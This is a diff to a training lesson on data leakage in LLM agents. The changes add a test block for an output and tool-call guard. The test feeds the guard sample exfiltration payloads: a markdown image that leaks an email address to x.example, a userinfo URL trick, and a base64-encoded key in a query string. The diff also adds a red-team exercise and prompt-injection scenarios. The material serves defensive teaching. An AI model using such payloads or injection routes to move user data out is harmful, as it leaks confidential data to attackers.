@@ -5,8 +5,14 @@ name: Data leakage
 kind: concept
 difficulty: core
 est_minutes: 17
-status: agentic-verified
+status: mastery
 agent_relevance: core
+mastery: implement
+code_tested: yes
+prerequisites:
+  - safety-security/prompt-injection
+  - safety-security/pii-redaction
+  - observability/tracing
 related:
   - safety-security/pii-redaction
   - safety-security/cross-tenant-data-leakage
@@ -47,10 +53,9 @@ can send, and assume no boundary exists inside the context.
   answer, model weights, or out through a tool call or rendered link.
 - **Conventional data flows are enumerable.** Request, handler, database, response, each with a schema, so a
   privacy review can draw the diagram and sign it.
-- **An LLM app or agent dissolves that.** It concatenates many sources into one free-text prompt, sends it
-  to a model often hosted by someone else, stores prompt and completion in an observability tool by
-  default, derives embeddings stored elsewhere, and emits output that may contain any of it in any order.
-  The model has no notion that one part of its context is confidential.
+- **An LLM app or agent dissolves that.** One free-text prompt from many sources goes to a model often
+  hosted by someone else, is stored by an observability tool by default, spawns embeddings stored
+  elsewhere, and output may contain any of it in any order.
 - **Three naive answers each cover a sliver.**
   - *"The provider does not train on API data"*: retention windows, subprocessors and abuse-monitoring
     logs still exist, and your own trace store, readable by every engineer, is usually the larger exposure.
@@ -160,8 +165,8 @@ flowchart TD
 ### An output and tool-call guard for the agent loop
 Runs on every completion and every tool call before execution. It blocks known secret formats and planted
 canaries, strips remote markdown images (the silent-GET channel), and refuses tool arguments that would
-contact a host outside the allow-list. It is deliberately high-precision: it will not catch everything,
-but what it catches it catches reliably.
+contact a host outside the allow-list. It is deliberately high-precision: it misses things, but what it
+catches is reliable.
 
 ```python
 import re
@@ -203,10 +208,20 @@ def guard_tool_call(name: str, args: dict) -> None:
 # inside the agent loop:
 #   text = guard_completion(llm_text)
 #   guard_tool_call(call.name, call.args); then execute the call
+if __name__ == "__main__":                      # the attacks from the table below
+    print(guard_completion("Done ![s](https://x.example/p.png?d=jane@corp.example)"))
+    for name, args in [("fetch_url", {"url": "https://docs.example.com@x.example/"}),
+                       ("post_note", {"body": "key AKIAIOSFODNN7EXAMPLE"}),
+                       ("fetch_url", {"url": "https://docs.example.com/q?k=QUtJQUlPU0ZPRE5ON0VYQU1QTEU="})]:
+        try:
+            guard_tool_call(name, args); print("ALLOWED", name)
+        except LeakBlocked as e:
+            print("BLOCKED", e)
 ```
 
 - **On a block,** return the `LeakBlocked` message to the model as the tool result and log the call with
-  the context items that preceded it, so you can find the injection source later.
+  the context items that preceded it, so you can find the injection source later. Running the file
+  reproduces the four rows below.
 
 ### Tracing attacks through the guard
 | Attack | What the guard does | Result |
@@ -288,18 +303,23 @@ print(rehydrate(reply, vault))                   # real value restored on the wa
 
 ## Pitfalls
 - **Authorization or secrets in the system prompt** ("you may only access accounts of user 1234"). Symptom:
-  a jailbreak prints the prompt and a customer now knows the trick.
-- **Tracing SDK left on full capture.** Symptom: a privacy review discovers a third-party dashboard with
-  months of customer conversations and tool results.
-- **Rendering remote images from model output.** Symptom: outbound requests to unfamiliar hosts with
-  suspiciously long query strings in the client's network log.
+  a jailbreak prints the prompt and a customer now knows the trick. Diagnose: run extraction prompts and
+  scan the prompt for keys and rules that only code should enforce. Fix: move them server-side.
+- **Tracing SDK left on full capture.** Symptom: a privacy review finds a third-party dashboard with months
+  of conversations and tool results. Diagnose: sample exported spans and check body fields and retention.
+  Fix: redact before export.
+- **Rendering remote images from model output.** Symptom: outbound requests to unfamiliar hosts with long
+  query strings in the client's network log. Diagnose: CSP violation reports and image hosts in completions.
+  Fix: strip or proxy images.
 - **Treating embeddings as safe to share** with a lower-trust vendor or region. Symptom: a data-residency
   finding when someone asks where the vectors live.
 - **Allow-listing a host that stores or reflects input** (a shared bucket, a public paste or issue tracker,
-  an endpoint with an open redirect). Symptom: zero blocked-egress events while data still turns up
-  outside, because the attacker reads it from the allowed host.
+  an open redirect). Symptom: zero blocked-egress events while data still turns up outside, because the
+  attacker reads it from the allowed host. Diagnose: audit each entry for user-writable storage and
+  redirects.
 - **Fine-tuning on raw support tickets, testing only task accuracy.** Symptom: the model emits a real
-  customer's name and order details when prompted with a similar ticket.
+  customer's name and order details for a similar ticket. Diagnose: extraction probes with ticket prefixes
+  and planted canaries. Fix: deduplicate and de-identify, or use retrieval.
 
 ## When to use
 - **Use when:** data classified above "public" touches an LLM path: a new integration, tracing vendor, agent
@@ -308,8 +328,16 @@ print(rehydrate(reply, vault))                   # real value restored on the wa
   exit; then egress controls and output DLP; treat training on sensitive data as the last resort.
 - **Measure:** the share of prompt fields that are classified, trace redaction coverage, egress allow-list
   violations blocked, and canary hits in outputs.
-- **Interviews:** "what are all the ways customer data could leave this system?" A strong answer enumerates
-  provider, completion, tools and rendering, logs, weights, embeddings and caches, not just PII redaction.
+
+## Exercise
+**Goal:** red-team and then guard a small agent across four leakage channels. No solution given.
+- **Inputs:** an agent with `fetch_url` and `post_note`, a confidential document holding a canary and a
+  fake account number, a local page with injections, and tracing to a local file.
+- **Deliver:** prompt-side tokenisation, an output and tool-call guard, an egress allow-list of one local
+  host, and trace redaction; a table of each attack before and after.
+- **Acceptance:** a markdown-image exfiltration, a POST to an outside host and a userinfo URL trick are
+  blocked; the trace file contains no account number or canary; a base64-encoded canary is shown
+  contained, not detected; a normal question still gets answered.
 
 ## Role lens
 - **Engineer:** Builds the prompt with classified, minimised fields, configures trace redaction, and wires
@@ -374,13 +402,6 @@ format adaptation.
 - **Otherwise prefer retrieval,** because documents in a store can be filtered and deleted while weights
   cannot honour a deletion request without retraining.
 
-### Your output guard blocked zero egress events last month but data still appeared outside. How?
-- **The allow-list probably includes a host that stores or reflects content:** a shared bucket, a public
-  paste or issue tracker, or an endpoint with an open redirect.
-- **The attacker reads it from the allowed host,** so the allow-list passed every request.
-- **Fix:** allow only hosts you control that do not reflect input, and audit allow-list entries for open
-  redirects and user-writable storage.
-
 ## Quiz
 ### Q: Which statement about embeddings and privacy is correct?
 - [ ] Embeddings are a one-way hash, so a vector store needs no access control
@@ -407,6 +428,17 @@ format adaptation.
 > Extraction of the system prompt is routinely achievable, so the only robust posture is that its
 > disclosure costs nothing; permissions and secrets belong in code and tokens, not in instructions the
 > model may repeat.
+
+## Mastery test
+**Problem:** a sales agent drafts emails from CRM records, has a `web_search` tool and a `send_email` tool
+limited to the company domain, and its traces go to a SaaS observability vendor. A prospect's website
+contains hidden instructions. List the leakage channels in order of risk and the control for each.
+
+**A strong answer:**
+- spots that search results put untrusted text next to CRM data, so egress is the first risk;
+- notes "company domain only" can still reach a shared inbox or forwarding rule, so gate or taint `send_email`;
+- covers the silent channels: remote images in drafts, full CRM bodies in vendor traces, the provider;
+- ranks prevention (minimise CRM fields) and containment above output DLP, and names a canary test.
 
 ## Use cases & projects
 ### Use cases
